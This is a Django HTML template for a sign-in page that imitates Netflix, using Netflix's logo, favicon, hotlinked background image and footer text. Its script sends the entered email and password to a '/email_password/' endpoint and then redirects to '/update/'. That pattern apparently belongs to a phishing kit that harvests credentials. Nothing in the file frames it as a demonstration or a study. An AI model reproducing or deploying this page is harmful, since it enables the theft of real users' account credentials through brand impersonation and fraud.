{% load static %}
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="{% static "/css/style.css" %}">
    <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.1/src/js.cookie.min.js"></script>
    <script
      src="https://kit.fontawesome.com/7684cd9b2c.js"
      crossorigin="anonymous"></script>

    <link
      rel="icon"
      href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png" />
  </head>

  <body class="xfont">
    <header
      style="
        background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/7ca5b7c7-20aa-42a8-a278-f801b0d65fa1/8120326d-a774-464c-a301-6e9acfdb4d7c/MA-en-20240326-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
      "
      class="md:h-[110vh] h-[105vh] bg-red-500 relative w-full flex justify-start items-center flex-col relative">
      <div
        class="flex flex-col justify-start items-center absolute inset-0 bg-[#000000A6]">
        <!-- nav barre  -->
        <nav
          class="xl:w-[65%] w-full h-[10%] flex justify-between items-center p-6 md:bg-transparent bg-black">
          <!-- logo -->
          <a
            href="{% url 'home' %}"
            id="logo"
            class="h-auto md:w-[120px] w-[100px] mt-4">
            <svg
              viewBox="0 0 111 30"
              version="1.1"
              xmlns="http://www.w3.org/2000/svg"
              xmlns:xlink="http://www.w3.org/1999/xlink"
              aria-hidden="true"
              role="img"
              class="text-red-600 fill-current">
              <g>
                <path
                  d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
              </g>
            </svg>
          </a>
        </nav>

        <div class="w-full h-[90%] flex justify-center items-center">
          <span
            class="relative md:border-none border-b-4 border-[#828282] md:bg-[#000000B0] md:h-[680px] w-full h-full bg-black md:w-[450px] md:rounded-md flex justify-center items-center text-white">
            <div id="loader" class="absolute hidden nfLoader"></div>
            <span class="md:w-[70%] w-[90%]">
              <h1
                style="font-weight: 800"
                class="text-white text-left w-full text-[30px]">
                Sign In
              </h1>
              <div class="flex flex-col gap-4 mt-8 md:my-10">
                {% csrf_token %}
                <input
                  id="email_field"
                  type="email"
                  class="w-full h-14 rounded-md p-2 bg-[#00000086] border-[#828282] border-[1px] placeholder-[#828282]"
                  placeholder="Email or phone number" />
                <span
                  id="big_email_error"
                  class="text-red-600 text-[12px] hidden flex flex-row justify-start items-center">
                  <i class="fa-regular fa-circle-xmark mr-2"></i>
                  <h3 id="emailerror"></h3>
                </span>
                <input
                  id="password_Field"
                  type="text"
                  class="w-full h-14 rounded-md p-2 bg-[#00000080] border-[#828282] border-[1px] placeholder-[#828282]"
                  placeholder="Password" />

                <span
                  id="big_password_error"
                  class="text-red-600 text-[14px] hidden flex flex-row justify-start items-center">
                  <i class="fa-regular fa-circle-xmark mr-2"></i>
                  <h3 id="passworderror"></h3>
                </span>

                <button
                  onclick="ssubmit()"
                  style="font-weight: 500"
                  class="w-full bg-[#e50914] mb-4 h-12 rounded-md hover:bg-[#CB0711E4]">
                  Sign In
                </button>
              </div>
              <a href="#" class="mt-4 hover:underline text-[14px]"
                >Forgot password?</a
              >
              <span class="flex my-4 justify-start items-center">
                <input type="checkbox" class="w-4 h-4 p-2" checked />
                <span class="ml-2 text-[16px]">Remember me</span>
              </span>

              <h3 class="text-[#81898C] my-4">
                New to Netflix?<a href="#" class="text-white"> Sign up now.</a>
              </h3>
              <p class="text-[#7B7B7B] text-[13px] md:text-[16px]">
                This page is protected by Google reCAPTCHA to ensure you're not
                a bot. <a href="#" class="text-blue-500"> Learn more</a>
              </p>
            </span>
          </span>
        </div>

        <footer
          class="flex justify-center items-center w-full md:bg-[rgba(0,0,0,0.7)] bg-black h-[30%] text-[rgba(255,255,255,0.7)] gap-8">
          <div class="md:w-[80%] w-[95%] p-4">
            <h3 class="mb-4">Questions? Contact us.</h3>
            <span
              class="grid md:grid-cols-4 grid-cols-2 gap-4 underline text-[14px]">
              <h3>FAQ</h3>
              <h3>Help Center</h3>
              <h3>Terms of Use</h3>
              <h3>Privacy</h3>
              <h3>Cookie Preferences</h3>
              <h3>Corporate Information</h3>
            </span>
            <select
              name=""
              id=""
              style="font-weight: 400"
              class="xfont bg-black text-white md:px-4 px-0 py-1 border border-gray-500 rounded-md mt-4">
              <option value="1">English</option>
              <option value="2">العربية</option>
              <option value="3">Francais</option>
            </select>
          </div>
        </footer>
      </div>
    </header>
    <script>
      function ssubmit() {
        const emailField = document.getElementById('email_field');
        const passwordField = document.getElementById('password_Field');
        const emailValue = emailField.value.trim();
        const passwordValue = passwordField.value.trim();
        const bigEmailError = document.getElementById('big_email_error');
        const emailError = document.getElementById('emailerror');
        const bigPasswordError = document.getElementById('big_password_error');
        const passwordError = document.getElementById('passworderror');

        // Reset any previous validation errors
        bigEmailError.classList.add('hidden');
        emailField.classList.remove('border-red-600');
        passwordField.classList.remove('border-red-600');
        bigPasswordError.classList.add('hidden');

        // Email validation
        if (emailValue === '') {
          bigEmailError.classList.remove('hidden');
          emailField.classList.add('border-red-600');
          emailError.innerHTML = 'Add an email address';
          return; // Prevent further execution if there's a validation error
        } else if (!emailValue.includes('@') || !emailValue.includes('.')) {
          bigEmailError.classList.remove('hidden');
          emailField.classList.add('border-red-600');
          emailError.innerHTML = 'Please enter a valid email address.';
          return; // Prevent further execution if there's a validation error
        }

        // Password validation
        if (passwordValue === '') {
          passwordError.innerHTML = 'Enter your password';
          bigPasswordError.className =
            'text-red-600 text-[14px] flex flex-row justify-start items-center';
          passwordField.className =
            'w-full h-14 rounded-md p-2 bg-[#00000080] border-red-600 border-[1px] placeholder-[#828282]';
          return; // Prevent further execution if there's a validation error
        } else if (passwordValue.length < 4 || passwordValue.length > 60) {
          bigPasswordError.className =
            'text-red-600 text-[14px] flex flex-row justify-start items-center';
          passwordField.className =
            'w-full h-14 rounded-md p-2 bg-[#00000080] border-red-600 border-[1px] placeholder-[#828282]';
          passwordError.innerHTML =
            'Your password must contain between 4 and 60 characters.';
          return; // Prevent further execution if there's a validation error
        }

        // If no validation errors, proceed with sending data to the backend
        const csrfToken = document.getElementsByName('csrfmiddlewaretoken')[0]
          .value;
        const data = { email: emailValue, password: passwordValue };
        const options = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': csrfToken,
          },
          body: JSON.stringify(data),
        };

        fetch('/email_password/', options)
          .then((response) => {
            if (response.ok) {
              document.getElementById('loader').classList.remove('hidden');
              setTimeout(() => {
                window.location.href = '/update/';
              }, 500);
            } else {
              console.error('There was a problem with your fetch operation.');
            }
          })
          .catch((error) => {
            console.error(
              'There was a problem with your fetch operation:',
              error
            );
          });
      }
    </script>
  </body>
</html>
